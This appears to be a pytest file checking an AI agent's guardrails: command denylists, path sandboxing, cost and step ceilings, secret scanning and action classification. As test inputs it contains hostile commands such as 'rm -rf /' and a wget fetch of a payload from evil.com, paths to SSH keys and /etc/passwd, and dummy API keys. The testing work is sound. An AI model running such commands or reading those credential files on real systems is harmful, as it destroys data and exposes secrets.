from __future__ import annotations
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.agent_v2.guardrails import (
    Guardrails,
    is_destructive_command,
    sandbox_path,
    COST_CEILING_USD,
    scan_secrets,
)
from core.guardrails import classify_action, is_destructive_action


def test_destructive_detection():
    assert is_destructive_command("rm -rf /")[0] is True
    assert is_destructive_command("git push origin main")[0] is True
    assert is_destructive_command("npm install lodash")[0] is False
    assert is_destructive_command("npx tsc --noEmit")[0] is False


def test_sandbox_path():
    base = Path("/home/user/projects/my-app")
    assert sandbox_path(base / "src/index.ts", base) is True
    assert sandbox_path(Path("/etc/passwd"), base) is False


def test_cost_ceiling():
    g = Guardrails(project_path="/tmp/test")
    assert g.can_spend(5.0) is True
    assert g.can_spend(COST_CEILING_USD + 1.0) is False
    g.record_spend(8.0)
    assert g.can_spend(3.0) is False  # 8 + 3 > 10


# ------------------------------------------------------------------
# New tests — will fail until guardrails are wired into production code
# ------------------------------------------------------------------

def test_command_allowlist_blocks_curl():
    """curl is in both allowlist and denylist — it must be blocked (denylist wins)."""
    g = Guardrails(project_path="/tmp/test")
    allowed, reason = g.validate_command("curl https://example.com/data.zip")
    assert allowed is False, f"curl was allowed despite being in denylist: {reason}"


def test_scan_secrets_finds_openai_key():
    text = "The key is sk-abcdefghijklmnopqrstuvwxyz1234567890"
    secrets = scan_secrets(text)
    assert any(s[1] == "openai_api_key" for s in secrets), (
        f"scan_secrets missed OpenAI key in: {text}"
    )


def test_scan_secrets_finds_aws_key():
    text = "AKIAIOSFODNN7EXAMPLE"
    secrets = scan_secrets(text)
    assert any(s[1] == "aws_access_key" for s in secrets), (
        f"scan_secrets missed AWS key in: {text}"
    )


def test_scan_secrets_finds_jwt():
    text = "token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.test.signature"
    secrets = scan_secrets(text)
    assert any(s[1] == "jwt_token" for s in secrets), (
        f"scan_secrets missed JWT in: {text}"
    )


def test_scan_secrets_finds_credit_card():
    text = "My card is 4532015112830366"
    secrets = scan_secrets(text)
    assert any(s[1] == "visa_card" for s in secrets), (
        f"scan_secrets missed Visa card in: {text}"
    )


def test_classify_action_blocks_file_deletion():
    action = "delete all files in the downloads folder"
    classification, reason = classify_action(action)
    assert classification == "blocked", (
        f"Expected 'blocked' for file deletion, got {classification}: {reason}"
    )


def test_classify_action_flags_dangerous_click():
    action = "click the Delete button to remove the project"
    classification, reason = classify_action(action)
    assert classification == "dangerous", (
        f"Expected 'dangerous' for delete click, got {classification}: {reason}"
    )


def test_classify_action_allows_safe_navigation():
    action = "click the Chrome icon in the taskbar"
    classification, reason = classify_action(action)
    assert classification == "safe", (
        f"Expected 'safe' for app launch, got {classification}: {reason}"
    )


def test_validate_command_blocks_wget():
    g = Guardrails(project_path="/tmp/test")
    allowed, reason = g.validate_command("wget -O malware.sh http://evil.com/payload")
    assert allowed is False, f"wget was allowed: {reason}"


def test_validate_command_allows_git_status():
    g = Guardrails(project_path="/tmp/test")
    allowed, reason = g.validate_command("git status")
    assert allowed is True, f"git status was blocked: {reason}"


def test_sandbox_path_blocks_ssh_directory():
    base = Path("/home/user/projects/my-app")
    assert sandbox_path(Path("/home/user/.ssh/id_rsa"), base) is False


def test_sandbox_path_blocks_etc_hosts():
    base = Path("/home/user/projects/my-app")
    assert sandbox_path(Path("/etc/hosts"), base) is False


def test_hard_step_ceiling():
    """HARD_STEP_CEILING must be 50 and non-configurable."""
    from core.agent_v2.guardrails import HARD_STEP_CEILING
    assert HARD_STEP_CEILING == 50, (
        f"HARD_STEP_CEILING changed from 50 to {HARD_STEP_CEILING} — must be hardcoded"
    )
